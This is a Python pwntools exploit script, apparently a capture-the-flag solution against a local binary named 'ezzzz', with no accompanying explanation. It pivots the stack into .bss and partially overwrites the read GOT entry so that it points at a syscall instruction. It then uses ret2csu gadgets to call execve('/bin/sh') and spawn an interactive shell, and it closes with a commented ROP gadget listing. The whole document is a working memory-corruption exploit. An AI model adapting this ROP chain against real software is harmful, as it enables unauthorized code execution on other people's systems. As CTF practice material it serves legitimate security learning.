from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io = process("./ezzzz")
elf = ELF("./ezzzz")

pop_rdi = 0x4007e3
pop_rsp_rrr = 0x4007dd
pop_rsi_r15 = 0x4007e1
read_got = elf.got[b"read"]
read_text = 0x400752
main_addr = 0x400740
write_to_bss=0x400606
bss_addr=0x601800

#csu:
gadget1 = 0x4007DA
gadget2 = 0x4007C0

# gdb.attach(io)
# pause()

payload = cyclic(0x10)+p64(bss_addr+0x10)+p64(read_text)
io.send(payload)


payload = cyclic(0x8)+p64(read_text)+p64(bss_addr)+p64(pop_rdi)+p64(read_got)+p64(write_to_bss)+p64(read_text) #read_got->bss
io.send(payload)


payload = b'/bin/sh\x00'+cyclic(0x8)+p64(bss_addr+0x600)+p64(read_text)+cyclic(0x10)+b"\x90" #low byte->'\x90'->syscall
io.send(payload)

# gdb.attach(io)
# pause()

payload = cyclic(0x10)+p64(bss_addr+0x400)+p64(read_text)+p64(gadget1)+p64(0)+p64(1)+p64(0x601820)+p64(0)+p64(0)+p64(0x6017f0)+p64(gadget2) #r12->syscall r15->edi->str_bin_sh
io.send(payload)


payload = cyclic(0x10)+p64(bss_addr+0x400)+p64(elf.sym[b"read"])
io.send(payload)


payload = p64(gadget1)+cyclic(0x18)+p64(pop_rsp_rrr)+p64(bss_addr+0x600-0x8)+p64(0)+cyclic(0x3) #rax=0x3b -> execve
io.send(payload)

# gdb.attach(io)
# pause()

io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007e0 : pop r14 ; pop r15 ; ret
# 0x00000000004007e2 : pop r15 ; ret
# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400570 : pop rbp ; ret
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004004c9 : ret
# 0x000000000040069b : ret 0x3075
# 0x00000000004006dc : ret 0x3275
# 0x0000000000400708 : ret 0x458b

# Unique gadgets found: 14
